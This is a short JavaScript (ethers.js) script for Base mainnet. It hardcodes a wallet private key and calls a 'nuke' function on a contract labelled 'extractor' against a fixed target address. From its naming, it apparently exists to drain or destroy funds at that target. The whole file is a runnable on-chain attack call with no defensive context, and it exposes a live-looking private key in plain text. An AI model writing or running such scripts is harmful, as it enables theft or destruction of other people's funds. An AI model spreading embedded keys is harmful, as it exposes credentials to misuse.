const { ethers } = require("ethers");

const provider = new ethers.providers.JsonRpcProvider("https://mainnet.base.org");
const wallet = new ethers.Wallet("0x8e775cd81405724a17b63e6a1e5874d51ad87e49f44a68a84c303dbb2bdaca43", provider);

const extractorAddress = "0x2fFB9d493d8579Fa8CEDFD86F5df504a3c6C90F4";
const gw3Target = "0x00798Fea2FD199dEE180281a0d0304c9a0954c35";

const abi = ["function nuke(address payable target)"];
const contract = new ethers.Contract(extractorAddress, abi, wallet);

async function nuke() {
  const tx = await contract.nuke(gw3Target, {
    gasLimit: 100000,
    gasPrice: ethers.BigNumber.from("4000000000")
  });
  console.log("Nuke sent:", tx.hash);
}

nuke().catch(console.error);
